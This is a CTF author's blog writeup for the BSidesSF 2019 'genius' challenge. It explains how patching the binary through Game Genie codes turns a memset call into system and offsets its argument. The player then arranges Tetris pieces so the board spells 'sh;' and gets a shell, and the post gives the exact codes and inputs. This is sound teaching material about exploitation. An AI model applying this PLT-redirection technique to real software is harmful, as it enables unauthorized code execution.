---
id: 2392
title: 'BSidesSF CTF author writeup: genius'
date: '2019-03-11T11:20:07-05:00'
author: 'Ron Bowes'
layout: revision
guid: 'https://blog.skullsecurity.org/2019/2363-revision-v1'
permalink: '/?p=2392'
---

Hey all,

This is going to be an author's writeup of the BSidesSF 2019 CTF challenge: <tt>genius</tt>!

<tt>genius</tt> is probably my favourite challenge from the year, and I'm thrilled that it was solved by 6 teams! It was inspired by a few other challenges I wrote in the past, including [Nibbler](http://karabut.com/bsides-ctf-2017-nibbler-writeup.html). You can grab the sourcecode, solution, and everything needed to run it yourself [on our Github release](https://github.com/BSidesSF/ctf-2019-release/tree/master/challenges/genius)!

It is actually implemented as a pair of programs: [loader](https://blogdata.skullsecurity.org/loader.bz2) and [genius](https://blogdata.skullsecurity.org/genius.bz2). I only provide the binaries to the players, so it's up to the player to reverse engineer them. Fortunately, for this writeup, we'll have source to reference as needed!  
  
Ultimately, the player is expected to gain code execution by tricking <tt>genius</tt> into running <tt>system("sh;");</tt>, with the help of <tt>loader</tt> (at least, that's how I solved it and that's how others I talked to solved it). A hint to that is given when the game is initially started:

```

$ ./genius
In case it helps or whatever, system() is at 0x80485e0 and the game object is at 0x804b1a0. :)
```

After that, it starts displaying a Tetris-like commandline game, with the controls 'a' and 'd' to move, 'q' and 'e' to rotate, and 's' to drop the piece to the bottom.

Here's what the game board looks like with the first block (an 'O') falling:

```

+----------+
|          |
|          |
|          |
|          |
|          |
|   **     |
|   **     |
|          |
|          |
|          |
|          |
|          |
|          |
|          |
|          |
|          |
|          |
|          |
|          |
|          |
|          |
+----------+
Score: 0
```

And after some blocks fall:

```

+----------+
|          |
|          |
|          |
|          |
|          |
|          |
|          |
|          |
|          |
|          |
|          |
|          |
|          |
|        * |
|        * |
|       ** |
|   #      |
|   ##     |
|    #     |
|   ##   # |
|   ##  ###|
+----------+
Score: 3000
```

Simple enough! No obvious paths to code execution yet! But... that's where <tt>loader</tt> comes in.

## Loader

When <tt>loader</tt> runs, it asks for a "Game Genius code":

```

$ ./loader
Welcome to the Game Genius interface!
Loading game...
...
Loaded!

Please enter your first Game Genius code, or press <enter> to
continue!
```

Some players may guess by the name and format, and others may reverse engineer it, but the codes it wants are classic NES Game Genie codes.

I found an [online code generator written in JavaScript](https://web.archive.org/web/20180803050959/http://www.d.umn.edu/~bold0070/projects/game_genie_codes/javascript_game_genie_encoders-decoders.html) (it's not even online anymore so I linked to the archive.org version) that can generate codes. I only support the 6-character code - no "Key" value.

Interestingly, the code modifies the game *on disk* rather than in-memory. That means that the player has access to change basically anything, including read-only data, ELF headers, import table, and so on. After all, it wouldn't be NES if it had memory protection, right?

So the question is, what do we modify, and to what?

## The code

We're going to look at a bit of assembly now. In particular, the printf-statement at the start where the address of <tt>system</tt> is displayed looks like this:

```

<span class="Number">.text:08049462</span>                 <span class="Identifier">push</span>    <span class="Identifier">offset</span> <span class="Identifier">dword_804B1A0</span>
<span class="Number">.text:08049467</span>                 <span class="Identifier">push</span>    <span class="Identifier">offset</span> <span class="Identifier">_system</span>
<span class="Number">.text:0804946</span><span class="Identifier">C</span>                 <span class="Identifier">push</span>    <span class="Identifier">offset</span> <span class="Identifier">aInCaseItHelpsO</span> <span class="Comment">; "In case it helps or whatever, system() "...</span>
<span class="Number">.text:08049471</span>                 <span class="Identifier">call</span>    <span class="Identifier">_printf</span>
```

<tt>dword\_804B1A0</tt> is a bit array representing the game board, where each bit is 1 for a piece, and 0 for no piece. <tt>set\_square</tt> and <tt>get\_square</tt> are implemented like this, in the original C:

```

<span class="Type">void</span> <span class="Function">set_square</span>(<span class="Type">int</span> x, <span class="Type">int</span> y, <span class="Type">int</span> on) {
  <span class="Type">int</span> byte = ((y * BOARD_WIDTH) + x) / <span class="Number">8</span>;
  <span class="Type">int</span> bit  = ((y * BOARD_WIDTH) + x) % <span class="Number">8</span>;

  <span class="Conditional">if</span>(on) {
    game.board[byte] = game.board[byte] | (<span class="Number">1</span> << bit);
  } <span class="Conditional">else</span> {
    game.board[byte] = game.board[byte] & ~(<span class="Number">1</span> << bit);
  }
}


<span class="Type">int8_t</span> <span class="Function">get_square</span>(<span class="Type">int</span> x, <span class="Type">int</span> y) {
  <span class="Type">int</span> byte = ((y * BOARD_WIDTH) + x) / <span class="Number">8</span>;
  <span class="Type">int</span> bit = ((y * BOARD_WIDTH) + x) % <span class="Number">8</span>;

  <span class="Statement">return</span> (game.board[byte] & (<span class="Number">1</span> << bit)) ? <span class="Number">1</span> : <span class="Number">0</span>;
}
```

As you can see, <tt>game.board</tt> (which is simply <tt>dword\_804B1A0</tt>, which we saw earlier) starts are the upper-left, and encodes the board left to right. So the board we saw earlier:

```

...
|   #      |
|   ##     |
|    #     |
|   ##   # |
|   ##  ###|
+----------+
```

Is essentially ...0000010000000001100000000010000000011000100001100111 or 0x00...00401802018867. That's not entirely accurate, because each byte is encoded backwards, so we'd have to flip each set of 8 bits to get the actual value, but you get the idea (we won't encode by hand).

After the game ends, the board is cleared out with <tt>memset()</tt>:

```

<span class="Number">.text:08049547</span>                 <span class="Identifier">push</span>    <span class="Number">1</span><span class="Identifier">Ah</span>             <span class="Comment">; n</span>
<span class="Number">.text:08049549</span>                 <span class="Identifier">push</span>    <span class="Number">0 </span>              <span class="Comment">; c</span>
<span class="Number">.text:0804954B</span>                 <span class="Identifier">push</span>    <span class="Identifier">offset</span> <span class="Identifier">dword_804B1A0</span> <span class="Comment">; s</span>
<span class="Number">.text:08049550</span>                 <span class="Identifier">call</span>    <span class="Identifier">_memset</span>
```

There's that board variable again, <tt>dword\_804B1A0</tt>!

That \_memset call is where we're going to take control. But how?

## The exploit, part 1

First off, when <tt>memset</tt> is called, it jumps to this little stub in the .plt section:

```

<span class="Number">.plt:08048620</span>                   <span class="Comment">; void *memset(void *s, int c, size_t n)</span>
<span class="Number">.plt:08048620</span>                   <span class="Identifier">_memset</span>         <span class="Identifier">proc</span> <span class="Identifier">near</span>               <span class="Comment">; CODE XREF: main+57p</span>
<span class="Number">.plt:08048620</span>                                                           <span class="Comment">; main+150p</span>
<span class="Number">.plt:08048620</span> <span class="Number">FF 25 30 B0 04 08</span>                 <span class="Identifier">jmp</span>     <span class="Identifier">ds</span>:<span class="Identifier">off_804B030</span>
<span class="Number">.plt:08048620</span>                   <span class="Identifier">_memset</span>         <span class="Identifier">endp</span>
```

That's the .plt section - the Procedure Linkage Table. It's an absolute jump to the address stored at 0x804B030, which is the address of the real <tt>\_memset</tt> function once the dynamic library is loaded.

Just above that is <tt>\_system()</tt>:

```

<span class="Number">.plt:080485E0</span>                   <span class="Comment">; int system(const char *command)</span>
<span class="Number">.plt:080485E0</span>                   <span class="Identifier">_system</span>         <span class="Identifier">proc</span> <span class="Identifier">near</span>               <span class="Comment">; DATA XREF: main+67o</span>
<span class="Number">.plt:080485E0</span> <span class="Number">FF 25 20 B0 04 08</span>                 <span class="Identifier">jmp</span>     <span class="Identifier">ds</span>:<span class="Identifier">off_804B020</span>
<span class="Number">.plt:080485E0</span>                   <span class="Identifier">_system</span>         <span class="Identifier">endp</span>
```

It looks very similar to <tt>\_memset()</tt>, except one byte of the address is different - the instruction <tt>FF25**30**B00408</tt> becomes <tt>FF25**20**B00408</tt>!

With the first Game Genius code, I change the 0x30 in <tt>memset()</tt> to 0x20 for <tt>system</tt>. The virtual address is 0x08048620, which maps to the in-file address of 0x620 (IDA displays the real address in the bottom-left corner). Since we're changing the third byte, we need to change 0x620 + 2 => 0x622 from 0x30 to 0x20, which effectively changes every call to <tt>memset</tt> to instead call <tt>system</tt>.

Entering 622 and 20 into the online game genie code generator gives us our first code, **AZZAZT**.

## The exploit, part 2

So now, every time the game attempts to call <tt>memset(board)</tt> it calls <tt>system(board)</tt>. The problem is that the first few bits of <tt>board</tt> are quite hard to control (possibly impossible, unless you found another way to use the Game Genius codes to do it).

However, we can change one byte of the instruction <tt>push offset dword\_804B1A0</tt>, we can somewhat change the address. That means we can shift the address to somewhere *inside* the board instead of the start!

Since I have sourcecode access, I can be lazier than players and just set them to see what it'd look like. That way, I can look at putting "sh;" at each offset in the board to see which one would be easiest to build in-game. When I started working on this, I honestly didn't even know if this could work, but it did!

I'll start with the furthest possible value to the right (at the end of the board):

```

  game.board[BOARD_SIZE-3] = <span class="Character">'s'</span>;
  game.board[BOARD_SIZE-2] = <span class="Character">'h'</span>;
  game.board[BOARD_SIZE-1] = <span class="Character">';'</span>;
```

That creates a board that looks like:

```

...
|          |
|    ##  ##|
|#    # ## |
|## ###    |
+----------+
```

That looks like an awfully hard shape to make! So let's try setting the next three bytes towards the start:

```

  game.board[BOARD_SIZE-4] = <span class="Character">'s'</span>;
  game.board[BOARD_SIZE-3] = <span class="Character">'h'</span>;
  game.board[BOARD_SIZE-2] = <span class="Character">';'</span>;
...
|          |
|      ##  |
|###    # #|
|# ## ###  |
|          |
+----------+
```

That's still a pretty bad shape. How about third from the end?

```

  game.board[BOARD_SIZE-5] = <span class="Character">'s'</span>;
  game.board[BOARD_SIZE-4] = <span class="Character">'h'</span>;
  game.board[BOARD_SIZE-3] = <span class="Character">';'</span>;
...

|          |
|        ##|
|  ###    #|
| ## ## ###|
|          |
|          |
+----------+
```

That's starting to look like Tetris shapes! I chose that one, and tried to build it.

First, let's see which bytes "matter" - anything before "sh;" will be ignored, and anything after will run after "sh" exits, thanks to the ";" (you can also use "#" or "\\0", but fortunately I didn't have to):

```

...
|          |
|        ##|
|##########|
|##########|
|##        |
|          |
+----------+
```

All we really care about is setting the 1 and 0 values within that block properly.. nothing else before or after matters at all.:

```

|          |
|        11|
|0011100001|
|0110110111|
|00        |
|          |
+----------+
```

If we do a bit of math, we'll know that that value starts 0x15 bytes from the start of board. That means we want to change <tt>push offset dword\_804B1A0</tt> to <tt>push offset dword\_804B1A0+0x15</tt>, aka <tt>push offset dword\_804B1B5</tt>

In the binary, here is the instruction (including code bytes):

```

<span class="Number">.text:0804954B</span> <span class="Identifier">68 A0 B1 04 08</span>  <span class="Identifier">push</span>    <span class="Identifier">offset</span> <span class="Identifier">dword_804B1A0</span> <span class="Comment">; s</span>
<span class="Number">.text:08049550</span> <span class="Identifier">E8 CB F0 FF FF</span>  <span class="Identifier">call</span>    <span class="Identifier">_memset</span>
```

In the first line, we simply want to change 0xA0 to 0xB5. That instruction starts at in-file address 0x154B, and the 0xA0 is one byte from the start, so we want to change 0x154B+1 = 0x154C to 0xB5.

Throwing that address and value into the Game Genie calculator, we get our second code: **SLGOGI**

## Playing the game

All that's left is to play the game. Easy, right?

Fortunately for players (and myself!), I set a static random seed, which means you'll always get the same Tetris blocks in the same order. I literally wrote down the first 20 or so blocks, using [standard Tetris names](https://tetris.wiki/Tetromino). These are the ones that I ended up using, in order: O, S, T, J, O, Z, Z, T, O, Z, T, J, and L

Then I took a pencil and paper, and literally started drawing where I wanted pieces to go. We basically want to have a block where you see a '1' and a space where you see a '0'. Blank spaces can be either, since they're ignored.

Here's our starting state, once again:

```

|          |
|        <strong>11|
|0011100001|
|0110110111|
|00</strong>        |
|          |
+----------+
```

Then we get a O block. I'll notate it as "a", since it's the first block to fall:

```

|          |
|        <strong>11|
|0011100001|
|0110110111|
|00</strong>aa      |
|  aa      |
+----------+
```

So far, we're just filling in blanks. The next piece to fall is an S piece, which fits absolutely perfectly (and we label as 'b'):

```

|          |
|        <strong>11|
|00bb100001|
|0bb0110111|
|00</strong>aa      |
|  aa      |
+----------+
```

Then a T block, 'c', which touches a 1:

```

|          |
|        <strong>11|
|00bb100001|
|0bb0110c11|
|00</strong>aa   cc |
|  aa   c  |
+----------+
```

Then J ('d'):

```

|          |
|        <strong>1d|
|00bb10000d|
|0bb0110cdd|
|00</strong>aa   cc |
|  aa   c  |
+----------+
```

Then O ('e'):

```

|          |
|        <strong>1d|
|00bb10000d|
|0bb0110cdd|
|00</strong>aaee cc |
|  aaee c  |
+----------+
```

Then Z ('f'), which fills in the tip:

```

|          |
|         f|
|        ff|
|        <strong>fd|
|00bb10000d|
|0bb0110cdd|
|00</strong>aaee cc |
|  aaee c  |
+----------+
```

Then Z ('g') - here we're starting to throw away pieces, all we need is an L:

```

|          |
|         f|
| gg     ff|
|  gg    <strong>fd|
|00bb10000d|
|0bb0110cdd|
|00</strong>aaee cc |
|  aaee c  |
+----------+
```

Then T ('h'), still throwing away pieces:

```

|          |
|h         |
|hh       f|
|hgg     ff|
|  gg    <strong>fd|
|00bb10000d|
|0bb0110cdd|
|00</strong>aaee cc |
|  aaee c  |
+----------+
```

Then O ('i'), throw throw throw:

```

|          |
|h ii      |
|hhii     f|
|hgg     ff|
|  gg    <strong>fd|
|00bb10000d|
|0bb0110cdd|
|00</strong>aaee cc |
|  aaee c  |
+----------+
```

Then Z ('j'), thrown away:

```

|          |
|         j|
|h ii    jj|
|hhii    jf|
|hgg     ff|
|  gg    <strong>fd|
|00bb10000d|
|0bb0110cdd|
|00</strong>aaee cc |
|  aaee c  |
+----------+
```

Then T ('k'), thrown away:

```

|          |
|        k |
|        kk|
|        kj|
|h ii    jj|
|hhii    jf|
|hgg     ff|
|  gg    <strong>fd|
|00bb10000d|
|0bb0110cdd|
|00</strong>aaee cc |
|  aaee c  |
+----------+
```

Then J ('m'):

```

|          |
| m      k |
| m      kk|
|mm      kj|
|h ii    jj|
|hhii    jf|
|hgg     ff|
|  gg    <strong>fd|
|00bb10000d|
|0bb0110cdd|
|00</strong>aaee cc |
|  aaee c  |
+----------+
```

And finally, the L we needed to finish the last part of the puzzle ('o'):

```

|          |
| m      k |
| m      kk|
|mm      kj|
|h ii    jj|
|hhii    jf|
|hgg     ff|
|  ggo   <strong>fd|
|00bbo0000d|
|0bb0oo0cdd|
|00</strong>aaee cc |
|  aaee c  |
+----------+
```

I literally drew all that [on paper](https://lh3.googleusercontent.com/XP_NGHWbr6rxMZIf_sXePMzNOPj_fMq5Gs22GBtgkfUcUJmqQAZj9CUgFNVefQ2LOzEktQw-O5gY_deSk0-k6IXD8uGQnClvOtakz5A0NyzcxFNQYoE70CzVsVoxg3Uw6vsn5rGIZKXGjFFhtKKH6GvAMzc_vbB8DulmfXCpjNwsM8gu2LG6KGD0AHPF3HhdqyyTs5EH5C9EUeFgphtI-4-lzWjEdbYUbm5YzH6EfSqMs3h7lfBeArDF-cIBomXrlpoix9ox0BTKlCAS4Ygnox458YD74ECoTXpvCC0jAPE0Vq-KnpK81pjaXWQdYUgyorJ3xIho2EQJ724K9Xk3OpfZgYTeHAtzKRcy8EXB3tU0vsdvS-GY5kbEl38N7Qnx1f20nxCwEHmCEVmDGtvPlJOwvXVhTJbql_en8PCzsgIY5Ctix__9YVpRGx-F3iJOfQUvxVuNw6P8TQmpAV7UpDgAK7ipRh7tr__B7BFtFsrcOj1XQzUpctnebxGAmWk30aekgrXskkfiQ-dxexjj7U29KrHhpv3KZzUOQEtKPSgorIukE3mZ65cBvVDeNl7CsEPyYJ_tkTSIyFPJp7RQMGckk-0N2oSKZ-hMIvRdX-UxHHMeBHGv9ZWeEB0w68EwnbiPpvXzJqdB2ytUVQ1PtClF8givdWNr=w974-h1297-no), erasing and moving stuff as needed to get the shape right. Once I had the shape, I figured out the inputs that would be required by literally playing:

- as
- qaas
- eddds
- qdddds
- ds
- ddddds
- qaas
- eaaaas
- as
- ddddds
- edddds
- aaaaas
- eas

Followed by 's' repeated to drop every piece straight down until the board fills up and the game ends.

## To summarize

So here is the exploit, in brief!

Run <tt>./loader</tt> in the same folder as <tt>genius</tt> (or user the Dockerfile).

Enter code 1, AZZAZT, which changes <tt>memset</tt> into <tt>system</tt>

Enter code 2, SLGOGI, which changes <tt>system(board)</tt> to <tt>system(board+0x15)</tt>

Play the game, and enter the list of inputs shown just above.

When the game ends, like magic, a shell appears!

```

+----------+
|    *     |
|   *#*    |
|   ###    |
|   ##     |
|   ##     |
|    #     |
|   ##     |
|   #      |
|   ####   |
|     #    |
|   ###  # |
|#  #    ##|
|#####   ##|
|# ###   ##|
|####    ##|
|###     ##|
|  ###   ##|
|  ###    #|
| ## ## ###|
|  #### ## |
|  #### #  |
+----------+
$ pwd
/home/ron/projects/ctf-2019/challenges/genius/challenge/src
$ ls
blocks.h  genius  genius.c  genius.o  loader  loader.c  loader.o  Makefile
```

And there you have it!